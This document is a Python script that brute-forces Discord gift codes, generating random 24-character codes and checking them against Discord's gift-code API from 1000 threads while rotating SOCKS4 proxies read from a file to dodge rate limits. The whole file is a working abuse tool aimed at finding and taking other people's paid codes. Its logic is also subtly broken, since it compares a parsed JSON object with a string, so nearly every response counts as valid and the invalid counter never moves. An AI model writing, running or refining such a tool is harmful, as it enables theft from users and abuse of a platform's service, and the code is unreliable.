from email import message
from requests import get
from random import choice
from threading import Thread
import numpy
file = open("proxy.txt") 
sock4 = [x.strip() for x in file.readlines()] 

char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
count = {"valid":0,"invalid":0,"checked":0}
def start():
    proxy = f"socks4://{choice((sock4))}"
    while True:
        code = ''.join(numpy.random.choice(list(char), 24))
        try:
            resp = get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true",proxies={"https":f"{proxy}"},timeout=1).json()
            print(resp,code,proxy)
            count["checked"] +=1
            if resp !=  "{'message': 'Unknown Gift Code', 'code': 10038}":
                count["valid"] +=1

            else:
                count["invalid"]

            if count["checked"] % 100 == 0:
                print(count)
        except: 
            proxy = f"socks4://{choice((sock4))}"

for i in range(1000):
    Thread(target=start).start()